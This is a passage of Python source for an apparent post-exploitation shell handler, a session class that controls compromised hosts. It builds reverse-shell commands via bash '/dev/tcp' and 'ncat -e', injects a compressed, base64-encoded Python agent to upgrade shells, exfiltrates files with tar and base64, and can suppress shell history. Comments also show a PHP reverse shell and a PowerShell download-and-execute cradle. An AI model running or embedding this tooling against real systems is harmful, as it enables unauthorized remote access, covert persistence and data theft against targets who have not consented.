		return [session for session in core.hosts[self.name] if not session.need_control_session]

	@property
	def control_session(self):
		if self.need_control_session:
			for session in core.hosts[self.name]:
				if not session.need_control_session:
					return session
			return None #self.spawn() #TODO
		else:
			return self

	def get_shell_pid(self):
		self.shell_pid = self.exec("echo $$", bypass=True, agent_typing=True, value=True)
		if not (isinstance(self.shell_pid, str) and self.shell_pid.isnumeric()):
			logger.error("Cannot get the PID of the shell. I am killing it...")
			self.kill()
			return False

	@property
	def cwd(self):
		if not self._cwd:
			if self.OS == 'Unix':
				if not self.shell_pid:
					self.get_shell_pid()
				cmd = f"readlink -f /proc/{self.shell_pid}/cwd"
				if self.agent:
					self.send(Messenger.message(Messenger.SHELL_EXEC, cmd.encode()))
					self._cwd = self.responses.get().rstrip().decode()
				else:
					self._cwd = self.control_session.exec(cmd, value=True)
			elif self.OS == 'Windows':
				self._cwd = self.control_session.exec("pwd", value=True)

		return self._cwd

	@property
	def is_attached(self):
		return core.attached_session is self

	@property
	def source(self):
		return 'reverse' if self.listener else 'bind'

	@property
	def bin(self):
		if not self._bin:
			if self.OS == "Unix":
				binaries = [
					"sh", "bash", "python", "python3",
					"script", "socat", "stty", "echo", "base64", "wget",
					"curl", "tar", "rm", "stty", "nohup", "find"
				]
				response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
				if response:
					self._bin = dict(zip(binaries, response.decode().splitlines()))

				missing = [b for b in binaries if not self._bin[b].startswith("/")]

				if missing:
					logger.debug(paint(f"We didn't find the binaries: {missing}. Trying another method").red) 
					response = self.exec(
						f'for bin in {" ".join(missing)}; do for dir in '
						f'{" ".join(LINUX_PATH.split(":"))}; do _bin=$dir/$bin; ' # TODO PATH
						'test -f $_bin && break || unset _bin; done; echo $_bin; done'
					)
					if response:
						self._bin.update(dict(zip(missing, response.decode().splitlines())))

			for binary in options.no_bins:
				self._bin[binary] = None

			result = "\n".join([f"{b}: {self._bin[b]}" for b in binaries])
			logger.debug(f"Available binaries on target: \n{paint(result).red}")

		return self._bin

	@property
	def tmp(self):
		if self._tmp is None:
			if self.OS == "Unix":
				logger.debug(f"Trying to find a writable directory on target")
				tmpname = rand(10)
				common_dirs = ("/dev/shm", "/tmp", "/var/tmp")

				for directory in common_dirs:
					if not self.exec(f'echo {tmpname} > {directory}/{tmpname}'):
						self.exec(f'rm {directory}/{tmpname}')
						self._tmp = directory
						break
				else:
					candidate_dirs = self.exec(f'find / -type d -writable 2>/dev/null')
					if candidate_dirs:
						for directory in candidate_dirs.decode().splitlines():
							if directory in common_dirs:
								continue
							if not self.exec(f'echo {tmpname} > {directory}/{tmpname}'):
								self.exec(f'rm {directory}/{tmpname}')
								self._tmp = directory
								break
				if not self._tmp:
					self._tmp = False
					logger.warning("Cannot find writable directory on target...")
				else:
					logger.debug(f"Available writable directory on target: {paint(self._tmp).RED}")

			elif self.OS == "Windows":
				self._tmp = "%TEMP%"

		return self._tmp


	def send(self, data, stdin=False):
		with self.wlock: #TODO
			if not self in core.rlist:
				return False

			self.outbuf.seek(0, io.SEEK_END)
			self.outbuf.write(data)

			self.subchannel.allow_receive_shell_data = True

			if self not in core.wlist:
				core.wlist.append(self)
				if not stdin:
					core.control << ""

	def record(self, data, _input=False):
		self.last_lines << data
		if not options.no_log:
			self.log(data, _input)

	def log(self, data, _input=False):
		#data=re.sub(rb'(\x1b\x63|\x1b\x5b\x3f\x31\x30\x34\x39\x68|\x1b\x5b\x3f\x31\x30\x34\x39\x6c)', b'', data)
		data = re.sub(rb'\x1b\x63', b'', data) # Need to include all Clear escape codes

		if not options.no_timestamps:
			timestamp = datetime.now().strftime(str(paint("%Y-%m-%d %H:%M:%S: ").magenta)) #TEMP
			data = re.sub(rb'(\r\n|\r|\n|\v|\f)', rf'\1{timestamp}'.encode(), data)

		try:
			if _input:
				self.logfile.write(bytes(paint('ISSUED ==>').GREEN+' ', encoding='utf8'))

			self.logfile.write(data)

		except ValueError:
			logger.debug("The session killed abnormally")

	def determine(self, path=False):
		history = ' export HISTFILE=/dev/null;' if options.no_history else ''
		path = f' export PATH=$PATH:{LINUX_PATH};' if path else ''
		cmd = f'{path} export HISTCONTROL=ignoreboth;{history} echo $((1*1000+3*100+3*10+7))`tty`'
		outcome = b'1337'

		response = self.exec(cmd + '\n', expect=(outcome, b"Windows PowerShell", b'SHELL> ', b'PS>', b'> '), raw=True)

		if not response:
			return False

		match = re.search (
			rf"(Microsoft Windows \[Version (.*)\].*){re.escape(cmd)}".encode(),
			response,
			re.DOTALL
		)

		# Windows cmd.exe
		if match:
			self.OS =		'Windows'
			self.type =		'Basic'
			self.subtype =		'cmd'
			self.interactive =	 True
			self.echoing =		 True
			self.prompt =		match[1].replace(b"'export' is not recognized\
			 as an internal or external command,\r\noperable program or batch file.\r\n", b"") # TODO
			self.version =		match[2]
			return True

		# Windows Powershell
		if re.match(
			rf"{outcome.decode()}.*\r\nPS [A-Za-z]:\\".encode(),
			response,
			re.DOTALL
		) or response in (b'SHELL> ', b'PS>', b'> ') or response.startswith(b"Windows PowerShell"):
			self.OS =		'Windows'
			self.type =		'Basic'
			self.subtype =		'psh'
			self.interactive =	 True
			self.echoing =		 False
			self.prompt =		response.splitlines()[-1]
			return True

		# Unix without PATH
		if outcome in response and not (b'not a tty' in response or b'/dev/pts/' in response):
			logger.debug("NO PATH...")
			return self.determine(path=True) if not path else False

		# Unix sh / bash
		if response.startswith(outcome):
			self.OS =		'Unix'
			self.type =		'Basic'
			self.interactive =	 False
			self.echoing =		 False
			self.prompt =		b''
			return True

		match = re.match(
			rf"(.*){outcome.decode()}".encode(),
			response,
			re.DOTALL
		)

		# Unix sh -i / bash -i
		if match:
			self.OS =		'Unix'
			self.interactive =	 True

			match2 = re.match(
				rf"(.*){re.escape(cmd)}".encode(),
				match[1],
				re.DOTALL
			)

			if match2:
				self.echoing =	 True
				self.prompt =	match2[1]
			else:
				self.echoing =	 False
				self.prompt =	match[1]

			if b'not a tty' in response:
				self.type =	'Basic'

			elif b'/dev/pts/' in response:
				self.type =	'PTY'

			return True

		return None

	def exec(
		self,
		cmd=None, 		# The command line to run
		raw=False, 		# Delimiters
		value=False,		# Will use the output elsewhere?
		timeout=False,		# Timeout
		expect=None,		# Items to wait for in the response
		bypass=False,		# Control session usage
		preserve_dir=False,	# Current dir preservation when using control session
		separate=False,		# If true, send cmd via this method but receive with TLV method
		agent_typing=False	# Simulate typing on shell (for agent)
	):

		with self.lock:

			if self.agent and not agent_typing: # TODO environment will not be the same as shell
				if cmd:
					self.send(Messenger.message(Messenger.SHELL_EXEC, cmd.encode()))
					try:
						return self.responses.get(timeout=15)#options.short_timeout)
					except queue.Empty: # TODO temp fix: this is dangerous as next responses may come out of order
						return b""
				return None

			if self.need_control_session and not bypass:
				if preserve_dir:
					self.control_session.exec(f"cd {self.cwd}")
				args = locals()
				del args['self']
				response = self.control_session.exec(**args)
				if preserve_dir:
					self.control_session.exec("cd -")
				return response

			if not self or not self.subchannel.can_use:
				logger.debug("Exec: The session is killed")
				return False

			self.subchannel.active = True
			self.subchannel.result = None
			buffer = io.BytesIO()
			_start = time.perf_counter()

			# Constructing the payload
			if cmd is not None:
				initial_cmd = cmd
				cmd = cmd.encode()

				if raw:
					if self.OS == 'Unix':
						cmd = b' ' + cmd + b'\n'

					elif self.OS == 'Windows':
						cmd = cmd + b'\r\n'
				else:
					token = [rand(10) for _ in range(4)]

					if self.OS == 'Unix':
						cmd = (
							f" {token[0]}={token[1]} {token[2]}={token[3]};"
							f"echo -n ${token[0]}${token[2]};"
							f"{cmd.decode()};"
							f"echo -n ${token[2]}${token[0]}\n".encode()
						)

					elif self.OS == 'Windows': # TODO
						if self.subtype == 'cmd':
							sep = '&'
						elif self.subtype == 'psh':
							sep = ';'
						cmd = (
							f"set {token[0]}={token[1]}{sep}set {token[2]}={token[3]}\r\n"
							f"echo %{token[0]}%%{token[2]}%{sep}{cmd.decode()}{sep}"
							f"echo %{token[2]}%%{token[0]}%\r\n".encode()
						)

					self.subchannel.pattern = re.compile(
						rf"{token[1]}{token[3]}(.*){token[3]}{token[1]}"
						rf"{'.' if self.interactive else ''}".encode(), re.DOTALL)

				logger.debug(f"\n\n{paint(f'Command for session {self.id}').YELLOW}: {initial_cmd}")
				logger.debug(f"{paint('Command sent').yellow}: {cmd.decode()}")
				if self.agent and agent_typing:
					cmd = Messenger.message(Messenger.SHELL, cmd)
				self.send(cmd)
				self.subchannel.allow_receive_shell_data = False # TODO

			data_timeout = options.short_timeout if timeout is False else timeout
			continuation_timeout = options.latency

			timeout = data_timeout
			last_data = time.perf_counter()
			need_check = False
			while self.subchannel.result is None:

				logger.debug(paint(f"Waiting for data (timeout={timeout})...").blue)
				readables, _, _ = select.select([self.subchannel.control, self.subchannel], [], [], timeout)

				if self.subchannel.control in readables:
					command = self.subchannel.control.get()
					logger.debug(f"Subchannel Control Queue: {command}")

					if command == 'stop':
						self.subchannel.result = False
						break

					elif command == 'kill':
						self.subchannel.can_use = False
						self.subchannel.result = False
						break

					self.subchannel.control.done()

				if self.subchannel in readables:
					logger.debug(f"Latency: {time.perf_counter() - last_data}")
					last_data = time.perf_counter()

					data = self.subchannel.read()
					buffer.write(data)
					logger.debug(f"{paint('Received').GREEN} -> {data}")

					if timeout == data_timeout:
						timeout = continuation_timeout
						need_check = True

				else:
					if timeout == data_timeout:
						logger.debug(paint("TIMEOUT").RED)
						self.subchannel.result = False
						break
					else:
						need_check = True
						timeout = data_timeout

				if need_check:
					need_check = False

					if raw and self.echoing and cmd:
						result = buffer.getvalue()
						if re.search(re.escape(cmd) + (b'.' if self.interactive else b''), result, re.DOTALL):
							self.subchannel.result = result.replace(cmd, b'')
							break
						else:
							logger.debug("The echoable is not exhausted")
							continue
					if not raw:
						check = self.subchannel.pattern.search(buffer.getvalue())
						if check:
							logger.debug(paint('Got all data!').green)
							self.subchannel.result = check[1]
							break
						logger.debug(paint('We didn\'t get all data; continue receiving').yellow)

					elif expect:
						for item in expect:
							if item in buffer.getvalue():
								logger.debug(paint(f"The expected string {item} found in data").yellow)
								self.subchannel.result = buffer.getvalue()
								break
						else:
							logger.debug(paint('No expected strings found in data. Receive again...').yellow)

					else:
						logger.debug(paint('Maybe got all data !?').yellow)
						self.subchannel.result = buffer.getvalue()
						break

			_stop = time.perf_counter()
			logger.debug(f"{paint('FINAL TIME: ').white_BLUE}{_stop - _start}")

			if value and self.subchannel.result is not False:
				self.subchannel.result = self.subchannel.result.rstrip().decode()
			logger.debug(f"{paint('FINAL RESPONSE: ').white_BLUE}{self.subchannel.result}")
			self.subchannel.active = False

			if separate and self.subchannel.result:
				buffer = io.BytesIO()
				for _type, _value in self.messenger.feed(self.subchannel.result):
					buffer.write(_value)
				return buffer.getvalue()

			return self.subchannel.result

	def need_binary(self, name, url):
		options = (
			f"\n  1) Upload {paint(url).blue}{paint().magenta}"
			f"\n  2) Upload local {name} binary"
			f"\n  3) Specify remote {name} binary path"
			f"\n  4) None of the above\n"
		)
		print(paint(options).magenta)
		answer = ask("Select action")

		if answer == "1":
			return self.upload(
				url,
				remote_path=self.tmp,
				randomize_fname=False
			)[0]

		elif answer == "2":
			local_path = ask(f"Enter {name} local path")
			if local_path:
				if os.path.exists(local_path):
					return self.upload(
						local_path,
						remote_path=self.tmp,
						randomize_fname=False
					)[0]
				else:
					logger.error("The local path does not exist...")

		elif answer == "3":
			remote_path = ask(f"Enter {name} remote path")
			if remote_path:
				if not self.exec(f"test -f {remote_path} || echo x"):
					return remote_path
				else:
					logger.error("The remote path does not exist...")

		elif answer == "4":
			return False

		return self.need_binary(name, url)

	def upgrade(self):

		if self.type == 'PTY':
			logger.warning("The shell is already PTY...")
			return False

		logger.info("Attempting to upgrade shell to PTY...")

		if self.OS == "Unix":
			deploy_agent = False

			self.shell = self.bin['bash'] if self.bin['bash'] else self.bin['sh']
			if not self.shell:
				logger.warning("Cannot detect shell. Abort upgrading...")
				return False

			socat_cmd = f"{{}} - exec:{self.shell},pty,stderr,setsid,sigint,sane;exit 0"

			if self.bin['python3'] or self.bin['python']:
				if self.bin['python3']:
					_bin = self.bin['python3']
					_decode = 'b64decode'
					_exec = 'exec(_value, globals(), _locals)'

				elif self.bin['python']:
					_bin = self.bin['python']
					_decode = 'decodestring'
					_exec = 'exec _value in globals(), _locals'

				deploy_agent = True
				payload = base64.b64encode( zlib.compress(
					AGENT.format(
					self.shell,
					textwrap.indent(MESSENGER, "\t", lambda line: not line.startswith("class")),
					_exec,
					).encode())).decode()
				cmd = (
					f'{_bin} -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")));agent()\''
				)

			elif self.bin['script']:
				_bin = self.bin['script']
				cmd = f"{_bin} -q /dev/null; exit 0"

			elif self.bin['socat']:
				_bin = self.bin['socat']
				cmd = socat_cmd.format(_bin)

			else:
				_bin = self.tmp + '/socat'
				if not self.exec(f"test -f {_bin} || echo x"): # TODO maybe needs rstrip
					cmd = socat_cmd.format(_bin)

				else:
					logger.warning("Cannot upgrade shell with the available binaries...")
					socat_binary = self.need_binary(
						"socat",
						BINARIES['socat']
						)
					if socat_binary:
						_bin = socat_binary
						cmd = socat_cmd.format(_bin)

					else:
						logger.error("Falling back to basic shell support")
						return False

			if not deploy_agent and not self.spare_control_sessions: #### TODO
				logger.warning("Agent cannot be deployed. I need to maintain at least one basic session...")
				core.session_wait_host = self.name
				self.spawn()

				try:
					new_session = core.sessions[core.session_wait.get(timeout=options.short_timeout)]
					core.session_wait_host = None

				except queue.Empty:
					logger.error("Failed spawning new session")
					return False

				new_session.upgrade()
				if caller() == 'attach':
					new_session.attach()

				return False

			# Some shells are unstable in interactive mode
			# For example: <?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
			# Silently convert the shell to non-interactive before PTY upgrade.
			if self.interactive:
				self.interactive = False
				self.echoing = True
				self.exec(f"exec nohup {self.shell}", raw=True)
				self.echoing = False

			response = self.exec(f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}', separate=deploy_agent, raw=True)
			if not response:
				logger.error("The shell became unresponsive. I am killing it...")
				self.kill()
				return False

			logger.info(f"Shell upgraded successfully using {paint(_bin).yellow}{paint().green}! 💪")

			self.type =		'PTY'
			self.interactive =	 True
			self.echoing =		 True
			self.prompt =		response

			self.agent = 		deploy_agent

			self.get_shell_pid()
			if not self.agent: # TODO check for the binaries
				self.tty = self.exec(f"readlink -f /proc/{self.shell_pid}/fd/0", bypass=True, value=True)

		elif self.OS == "Windows":
			logger.warning("Upgrading Windows shell is not implemented yet.")
			#self.exec(f"powershell iex (New-Object Net.WebClient).DownloadString('http://X.X.X.X/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell {self._host} {self._port}", raw=False)
			#self.detach()
			#core.sessions[self.id + 1].attach()

		return True

	def update_pty_size(self):

		columns, lines = shutil.get_terminal_size()

		if self.agent:
			self.send(Messenger.message(Messenger.RESIZE, struct.pack("HH", lines, columns)))

		elif self.OS == 'Unix':
			#if self.alternate_buffer:
			#	logger.error(
			#		"(!) Need PTY resize. Please exit the current alternate buffer program"
			#	)
			#	self.need_resize = True
			#elif self.is_attached:
			#	logger.error(
			#		"(!) Please detach and attach again to resize the terminal"
			#	)
			#	self.need_resize = True
			#else:
			#	cmd = f"stty rows {self.dimensions.lines} columns {self.dimensions.columns}"
			#	self.exec(cmd, raw=False)
			#	self.need_resize = False
			self.exec(f"stty rows {lines} columns {columns} -F {self.tty}")

		elif self.OS == 'Windows':
			cmd = (
				f"$width={self.dimensions.columns};$height={self.dimensions.lines};"
				f"$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size "
				f"($width, $height);$Host.UI.RawUI.WindowSize = New-Object -TypeName "
				f"System.Management.Automation.Host.Size -ArgumentList ($width, $height)\r"
			)
			self.exec(cmd, raw=True) #TEMP
			#self.need_resize = False

		return True

	def attach(self):
		if threading.current_thread().name != 'Core':
			if self.new:
				self.new = False

				if not options.no_upgrade and not self.type == 'PTY':
					self.upgrade()

				if self.prompt:
					self.record(self.prompt)

			core.control << f'self.sessions[{self.id}].attach()'
			return True

		if core.attached_session is not None:
			return False

		core.attached_session = self
		core.rlist.append(sys.stdin)

		logger.info(
			f"Interacting with session {paint('[' + str(self.id) + ']').red}"
			f"{paint(', Shell Type:').green} {paint(self.type).CYAN}{paint(', Menu key:').green} "
			f"{paint(options.escape['key'] if self.type == 'PTY' else 'Ctrl-C').MAGENTA} "
		)

		if not options.no_log:
			logger.info(f"Logging to {paint(self.logpath).yellow_DIM} 📜")

		os.write(sys.stdout.fileno(), bytes(self.last_lines))

		if self.type == 'PTY':
			tty.setraw(sys.stdin)
			os.kill(os.getpid(), signal.SIGWINCH)

		self._cwd = None
		return True

	def detach(self):

		if threading.current_thread().name != 'Core':
			core.control << f'self.sessions[{self.id}].detach()'
			return

		if core.attached_session is None:
			return False

		core.attached_session = None
		core.rlist.remove(sys.stdin)

		if not self.type == 'Basic':
			termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)

		if self.id in core.sessions:
			print()
			logger.warning("Session detached...")
			menu.set_id(self.id)
		else:
			if options.single_session and len(core.sessions) == 0:
				core.stop()
				return
		menu.show()

		return True

	def download(self, remote_item_path):
		try:
			remote_globs = [glob for glob in shlex.split(remote_item_path)]
		except ValueError as e:
			logger.error(e)
			return []

		local_download_folder = self.directory / "downloads"
		try:
			local_download_folder.mkdir(parents=True, exist_ok=True)
		except Exception as e:
			logger.error(e)
			return []

		available_bytes = shutil.disk_usage(local_download_folder).free

		if self.OS == 'Unix':
			progress_bar = PBar(0, f"{paint('[+] ').green}{paint('--- ⇣ Downloading').blue}", 35)

			try:
				logger.info(paint('--- Remote packing...').blue)
				if self.agent:
					self.send(Messenger.message(Messenger.PYTHON_EXEC, f"os.chdir('{self.cwd}')".encode()))
					self.control_session.progress_recv_queue = queue.Queue()
					self.send(Messenger.message(Messenger.DOWNLOAD, remote_item_path.encode()))
					response = self.responses.get()
					while response  == b'-2':
						logger.error(self.responses.get().decode())
						response = self.responses.get()

					send_size = int(response)
					if send_size < 0:
						logger.error(self.responses.get().decode())
						return []

					actual_size = int(self.responses.get())
					if not actual_size:
						self.responses.get() # just consume
						return []
				else:
					cmd = f"du -bac {remote_item_path} 2>&1|tail -1|cut -f1"
					actual_size = int(self.exec(cmd, timeout=None, preserve_dir=True))
					if not actual_size:
						logger.warning(f"No such file or directory: {shlex.quote(remote_item_path)}")
						return []

					temp = self.tmp + "/" + rand(8)
					cmd = f"tar cz {remote_item_path} | base64 -w0 > {temp}"
					response = self.exec(cmd, timeout=None, preserve_dir=True).decode()
					errors = [line[5:] for line in response.splitlines() if line.startswith('tar: /')]
					for error in errors:
						logger.error(error)
					send_size = int(self.exec(f"stat --printf='%s' {temp}"))

				logger.info(
					f'{paint("--- Need to get ").blue}{paint().yellow_DIM}{send_size:,}{paint().blue_NORMAL} '
					f'bytes... They will be {paint().green_DIM}{actual_size:,}{paint().blue_NORMAL} when unpacked.'
				)

				# Check for local available space
				need = actual_size - available_bytes
				if need > 0:
					logger.error("Not enough space to download")
					logger.info(paint(f"--- We need {paint().yellow_DIM}{need:,}{paint().blue_NORMAL} more bytes...").blue)
					self.responses.get() # just consume
					return []

				progress_bar.end = send_size

				if not self.agent:
					self.control_session.progress_recv_queue = queue.Queue()

					data = io.BytesIO()
					for offset in range(0, send_size, options.download_chunk_size):
						response = self.exec(f"cut -c{offset + 1}-{offset + options.download_chunk_size} {temp}")
						if response is False:
							progress_bar.terminate()
							logger.error("Download interrupted")
							return []
						progress_bar.update(len(response))
						data.write(response)

					data = base64.b64decode(data.getvalue())
					self.exec(f"rm {temp}")
				else:
					while progress_bar.active:
						received = self.control_session.progress_recv_queue.get()
						progress_bar.update(received)
					del self.control_session.progress_recv_queue

					data = self.responses.get()

				logger.info(paint('--- Local unpacking...').blue)
				if not data:
					logger.error("Corrupted response")
					return []

				tar = tarfile.open(fileobj=io.BytesIO(data))

				items = tar.getnames()
				if not items:
					logger.warning("The item does not exist or access is denied")
					return []

				top_level_items = { re.match(f'[^{os.path.sep}]*', item)[0] for item in items }

				for item in top_level_items:
					local_item_path = local_download_folder / item
					if local_item_path.exists():
						new_path = local_item_path
						while new_path.exists():
							new_path = Path(str(new_path) + "_")
						local_item_path.rename(new_path)
						logger.debug(f"{local_item_path} exists. Renamed to {new_path}")

				tar.extractall(local_download_folder)
				downloaded = [local_download_folder / item for item in items]

				specified = set()
				for glob in remote_globs:
					specified.update(set(local_download_folder.glob(glob.lstrip('/'))))
				specified = specified.intersection(downloaded)

				for item in specified:
					logger.info(f"Downloaded => {paint(shlex.quote(pathlink(item))).yellow}") # PROBLEM with ../ TODO

				return specified

			except Exception as e:
				logger.error(e)
				return []

		elif self.OS == 'Windows':
			'''tempfile = f"{self.tmp}\\{rand(10)}.zip"

			#cmd = f"certutil -encode {remote_item_path} {tempfile} > nul && type {tempfile} && del {tempfile}"
			#data = base64.b64decode(b''.join(data.splitlines()[2:-1]))
			#cmd = psh

			cmd = (
				f'powershell -command "compress-archive -path \\"{remote_item_path}\\" -DestinationPath \\"{tempfile}\\"";'
				'$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivepath));'
				'Remove-Item $archivepath;'
				'Write-Host $b64"'

			)

			#print(cmd)

			data = self.exec(cmd)

			try:
				with zipfile.ZipFile(io.BytesIO(base64.b64decode(data)), 'r') as zipdata:
					for item in zipdata.infolist():
						item.filename = item.filename.replace('\\', '/')
						newpath = Path(zipdata.extract(item, path=local_download_folder))
						logger.info(f"Downloaded => {paint(shlex.quote(pathlink(newpath))).yellow}")

			except zipfile.BadZipFile:
				logger.error("Invalid zip format")

			except binascii.Error:
				logger.error("The item does not exist or access is denied")'''

			logger.warning("Upload on Windows shells is not implemented yet")

	def upload(self, local_item_path, remote_path=None, randomize_fname=False, pipe=None):

		destination = remote_path if remote_path else self.cwd

		if self.OS == 'Unix':
			if not self.agent:
				# Check if we can upload
				dependencies = ['echo', 'base64', 'tar', 'rm']
				for binary in dependencies:
					if not self.bin[binary]:
						logger.error(f"'{binary}' binary is not available at the target. Cannot upload...")
						return []

			local_item_path = os.path.expanduser(local_item_path)
			data = io.BytesIO()
			tar = tarfile.open(mode='w:gz', fileobj=data, format=tarfile.GNU_FORMAT)

			if re.match('(http|ftp)s?://', local_item_path, re.IGNORECASE):

				# URLs with special treatment
				local_item_path = re.sub(
					"https://www.exploit-db.com/exploits/",
					"https://www.exploit-db.com/download/",
					local_item_path
				)

				req = urllib.request.Request(local_item_path, headers={'User-Agent':options.useragent})

				logger.info(paint(f"--- ⇣  Downloading {local_item_path}").blue)
				ctx = ssl.create_default_context() if options.verify_ssl_cert else ssl._create_unverified_context()

				while True:
					try:
						response = urllib.request.urlopen(req, context=ctx, timeout=options.short_timeout)
						break
					except urllib.error.HTTPError as e:
						logger.error(e)
					except urllib.error.URLError as e:
						logger.error(e.reason)
						if type(e.reason) == ssl.SSLCertVerificationError:
							answer = ask("Cannot verify SSL Certificate. Download anyway? (y/N)")
							if answer.lower() == 'y': # Trust the cert
								ctx = ssl._create_unverified_context()
								continue
						else:
							answer = ask("Connection error. Try again? (Y/n)")
							if answer.lower() == 'n': # Trust the cert
								pass
							else:
								continue
					return []

				filename = response.headers.get_filename()
				items = [response.read()]

			elif local_item_path.startswith(os.path.sep):
				items = list(Path(os.path.sep).glob(local_item_path.lstrip(os.path.sep)))
			else:
				items = list(Path().glob(local_item_path))

			if not items:
				logger.warning(f"No such file or directory: {shlex.quote(local_item_path)}")
				return []

			if pipe and len(items) > 1:
				logger.warning(f"Only one script at a time please...")
				return []

			logger.info(paint("--- Local packing...").blue)

			altnames = []
			for item in items:

				if isinstance(item, bytes):
					name = Path(filename.strip('"')) if filename else Path(local_item_path.split('/')[-1])
					altname = f"{name.stem}-{rand(8)}{name.suffix}" if randomize_fname else name.name

					file = tarfile.TarInfo(name=altname)
					file.size = len(item)
					file.mode = 0o770
					file.mtime = int(time.time())

					tar.addfile(file, io.BytesIO(item))

				else:
					def handle_exceptions(func):
						def inner(*args, **kwargs):
							try:
								func(*args, **kwargs)
							except Exception as e:
								logger.error(e)
						return inner

					tar.add = handle_exceptions(tar.add)
					altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name

					tar.add(item, arcname=altname)

				altnames.append(altname)
				logger.debug(f"Added {altname} to archive")

			actual_size = sum([item.size for item in tar])
			if not actual_size:
				return []
			tar.close()

			data.seek(0)
			data = data.read() if self.agent else base64.b64encode(data.read())
			send_size = len(data)

			logger.info(
				f'{paint("--- Need to send ").blue}{paint().yellow_DIM}{send_size:,}{paint().blue_NORMAL} '
				f'bytes... They will be {paint().green_DIM}{actual_size:,}{paint().blue_NORMAL} when unpacked.'
			)

			# Check remote space
			if self.agent:
				self.send(Messenger.message(Messenger.PYTHON_EXEC, 
					b"stats = os.statvfs('.'); result = stats.f_bavail * stats.f_frsize"))
				available_space = int(self.responses.get())
			else:
				available_space = int(self.exec("df --block-size=1 .|tail -1|awk '{print $4}'", value=True))

			need = actual_size - available_space

			if need > 0:
				logger.error("Not enough space on target")
				logger.info(paint(f"--- We need {paint().yellow_DIM}{need:,}{paint().blue_NORMAL} more bytes...").blue)
				return []

			# Start Uploading
			progress_bar = PBar(send_size, f"{paint('[+] ').green}{paint('--- ⇥  Uploading').blue}", 35)

			if self.agent:
				if pipe:
					self.send(Messenger.message(Messenger.PYTHON_EXEC, f"agent.pipe_name = '{pipe}'".encode()))
				else:
					self.send(Messenger.message(Messenger.PYTHON_EXEC, f"os.chdir('{destination}')".encode()))

				self.control_session.progress_send_queue = queue.Queue()
				self.send(Messenger.message(Messenger.UPLOAD, data))

				while progress_bar.active:
					sent = self.control_session.progress_send_queue.get()
					progress_bar.update(sent)
				del self.control_session.progress_send_queue

				logger.info(paint("--- Remote unpacking...").blue)
				response = self.responses.get().decode()
				exit_code = self.responses.get()

			else:
				temp = self.tmp + "/" + rand(8)

				for chunk in chunks(data.decode(), options.upload_chunk_size):
					response = self.exec(f"echo -n {chunk} >> {temp}")
					if response is False:
						progress_bar.terminate()
						logger.error("Upload interrupted")
						return []
					progress_bar.update(len(chunk))

				logger.info(paint("--- Remote unpacking...").blue)
				dest = f"-C {remote_path}" if remote_path else ""
				cmd = f"base64 -d {temp} | tar xz {dest} 2>&1; temp=$?"
				response = self.exec(cmd, value=True, preserve_dir=True)
				exit_code = self.exec("echo $temp", value=True)
				self.exec(f"rm {temp}")

			if not pipe:
				altnames = list(map(lambda x: destination + ('/' if self.OS == 'Unix' else '\\') + x, altnames))

				if not int(exit_code):
					for item in altnames:
						logger.info(f"Uploaded => {paint(shlex.quote(str(item))).yellow}")
				else:
					logger.error(f"Upload failed")
					print(paint(textwrap.indent(response, " *  ")).yellow)
					return []

				return altnames
			else:
				logger.info(
					f"{paint('💉 Injected ').blue}{paint(local_item_path).yellow_DIM}"
					f"{paint().blue_NORMAL} to target's {paint('memory').red_DIM}"
				)
				return True

		elif self.OS == 'Windows':
			logger.warning("Upload on Windows shells is not implemented yet")

	def spawn(self, port=None, host=None):
		#print(threading.current_thread().name)
		if self.OS == "Unix":
			if any([self.listener, port, host]):
				if port is None: port = self._port
				if host is None: host = self._host

				new_listener = Listener(host, port)

				if self.bin['bash']:
					# bash -i doesn't always work
					# cmd = f'bash -c "exec bash >& /dev/tcp/{host}/{port} 0>&1 &"'
					# temp fix, appending 2>&1 because of popen in agent
					cmd = f'{self.bin["bash"]} -c "nohup {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &" 2>&1'

				elif self.bin['sh']:
					ncat_cmd = f'{self.bin["sh"]} -c "nohup {{}} -e {self.bin["sh"]} {host} {port} &"'
					ncat_binary = self.tmp + '/ncat'
					if not self.exec(f"test -f {ncat_binary} || echo x"):
						cmd = ncat_cmd.format(ncat_binary)
					else:
						logger.warning("ncat is not available on the target")
						ncat_binary = self.need_binary(
							"ncat",
							BINARIES['ncat']
							)
						if ncat_binary:
							cmd = ncat_cmd.format(ncat_binary)
						else:
							logger.error("Spawning shell aborted")
							return False
				else:
					logger.error("No available shell binary is present...")
					return False

				logger.info(f"Attempting to spawn a reverse shell on {host}:{port}")
				self.exec(cmd)

				# TODO maybe destroy the new_listener upon getting a shell?
				# if new_listener:
				#	new_listener.stop()
			else:
				host, port = self.socket.getpeername()
				logger.info(f"Attempting to spawn a bind shell from {host}:{port}")
				if not Connect(host, port):
					logger.info("Spawn bind shell failed. I will try getting a reverse shell...")
					return self.spawn(port, self._host)

		elif self.OS == 'Windows':
			logger.warning("Spawn Windows shells is not implemented yet")

		return True

	def task(self, cmd, _stdout=None, _stderr=None, localscript=None):
		if self.OS == "Unix":
			if self.agent:
				local_task_folder = self.directory / "tasks"
				try:
					local_task_folder.mkdir(parents=True, exist_ok=True)
				except Exception as e:
					logger.error(e)
					return False

				taskid = rand(8)
				while taskid in self.tasks:
					taskid = rand(8)

				if _stdout:
					outfile = self.directory / "tasks" / _stdout
				else:
					outfile = self.directory / "tasks" / (taskid + ".out")
				if _stderr:
					errfile = self.directory / "tasks" / _stderr
				else:
					errfile = outfile

				if localscript:
					if not self.upload(cmd, pipe=taskid):
						return False
					cmd = self.responses.get().decode()

				self.tasks[taskid] = {
					'command':cmd,
					'streams':{
						"1": open(outfile, "ab", buffering=0),
						"2": open(errfile, "ab", buffering=0)
					}
				}
				self.send(Messenger.message(Messenger.PYTHON_EXEC, f"os.chdir('{self.cwd}')".encode()))
				self.send(Messenger.message(Messenger.TASK, (taskid + cmd).encode()))
				self.tasks[taskid]['pid'] = self.responses.get().decode()

				logger.info(
					f"Task assigned with ID: {paint(taskid).yellow} "
